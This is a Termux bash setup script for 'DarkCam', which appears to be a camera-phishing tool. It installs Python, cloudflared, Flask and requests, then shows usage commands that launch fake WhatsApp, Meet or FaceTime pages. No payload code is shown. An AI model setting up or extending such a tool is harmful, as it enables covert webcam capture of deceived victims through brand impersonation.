#!/data/data/com.termux/files/usr/bin/bash
# DarkCam — Termux Setup Script
# Run: bash setup-termux.sh

R="\033[0m"
G="\033[38;5;196m"
O="\033[38;5;208m"
W="\033[38;5;255m"

echo -e "${G}"
echo "  ██████╗  █████╗ ██████╗ ██╗  ██╗ ██████╗ █████╗ ███╗   ███╗"
echo "  ██╔══██╗██╔══██╗██╔══██╗██║ ██╔╝██╔════╝██╔══██╗████╗ ████║"
echo "  ██║  ██║███████║██████╔╝█████╔╝ ██║     ███████║██╔████╔██║"
echo "  ██████╔╝██║  ██║██║  ██║██║  ██╗╚██████╗██║  ██║██║ ╚═╝ ██║"
echo "  ╚═════╝ ╚═╝  ╚═╝╚═╝  ╚═╝╚═╝  ╚═╝ ╚═════╝╚═╝  ╚═╝╚═╝     ╚═╝"
echo -e "${O}  [ Termux Setup Script | DarkCam v1.0.0 ]${R}"
echo ""

echo -e "  ${O}[*]${R} Updating pkg..."
pkg update -y -q 2>/dev/null

echo -e "  ${O}[*]${R} Installing dependencies..."
pkg install -y python git curl cloudflared 2>/dev/null || true

echo -e "  ${O}[*]${R} Installing Python packages..."
pip install flask colorama requests -q

echo -e "  ${O}[*]${R} Setting up storage permission..."
if ! ls ~/storage &>/dev/null; then
  echo -e "  ${O}[!]${R} Allow storage permission when prompted..."
  termux-setup-storage
  sleep 3
fi

echo -e "  ${G}[+]${R} Setup complete!"
echo ""
echo -e "  ${W}Usage:${R}"
echo -e "  ${O}python darkcam.py --page whatsapp${R}"
echo -e "  ${O}python darkcam.py --page meet${R}"
echo -e "  ${O}python darkcam.py --page facetime${R}"
echo ""
